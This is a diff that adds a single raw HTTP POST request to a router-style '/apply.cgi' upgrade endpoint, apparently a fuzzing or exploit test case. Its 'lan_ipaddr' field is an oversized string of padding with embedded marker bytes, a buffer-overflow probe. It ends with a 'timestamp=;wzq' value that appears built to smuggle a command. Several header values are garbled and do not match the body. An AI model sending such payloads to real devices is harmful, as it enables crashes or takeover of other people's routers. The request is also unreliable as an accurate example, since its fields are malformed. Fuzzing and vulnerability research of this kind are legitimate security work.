@@ -1,0 +1,8 @@
+POST /apply.cgi?UPG_upgrade.htm HTTP/1.1
+Host: 165
+Accept: con_type
+Connection: 83
+Content-Type: application/json
+Content-Length: 318
+
+lan_ipaddr=aaaaaaaaaaaaaaaaaaaWZQwaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaWZQwzaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&submit_flag=wifi_channel_coexist&%20timestamp=;wzq
